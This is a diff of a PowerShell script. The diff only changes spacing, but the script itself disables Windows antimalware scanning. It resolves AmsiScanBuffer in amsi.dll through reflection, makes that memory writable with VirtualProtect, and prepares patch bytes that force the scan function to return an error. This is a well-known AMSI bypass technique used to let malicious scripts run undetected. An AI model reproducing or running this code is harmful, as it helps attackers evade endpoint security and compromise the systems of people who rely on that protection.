@@ -7,7 +7,7 @@ function LookupFunc {
 
     Param ($moduleName, $functionName)
     $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $tmp=@()
+    $tmp = @()
     $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
     return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
 }
@@ -27,7 +27,7 @@ function getDelegateType {
 
 [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiScanBuffer
 $oldProtectionBuffer = 0
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
+$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
 $vp.Invoke($funcAddr, 5, 0x40, [ref]$oldProtectionBuffer)
 
 $buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
